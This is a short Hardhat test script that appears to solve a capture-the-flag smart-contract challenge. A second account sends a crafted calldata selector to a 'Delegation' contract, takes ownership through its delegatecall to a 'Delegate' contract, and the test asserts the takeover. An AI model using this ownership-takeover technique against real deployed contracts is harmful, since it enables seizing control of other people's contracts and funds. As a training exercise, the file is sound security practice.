import { TransactionRequest } from "@ethersproject/providers";
import { expect } from "chai";
import { Wallet } from "ethers";
import { ethers } from "hardhat";

describe("Delegation", function(){
	it("Should become owner", async function () {
		// setup
		const [ deployer, s1] = await ethers.getSigners();

		const contractDelegate = await (
			await ethers.getContractFactory("Delegate")
		).deploy(deployer.address);
		
		const contract = await (
			await ethers.getContractFactory("Delegation")
		).deploy(contractDelegate.address);

		// const data = await contract.data();
		// console.log(data);

		const tx = await s1.sendTransaction({
			to: contract.address,
			data: "0xdd365b8b",
			gasLimit: 100_000,
		})
		await tx.wait();

		// validate
		expect(
			await contract.owner()
		).to.equal(s1.address);

	})
})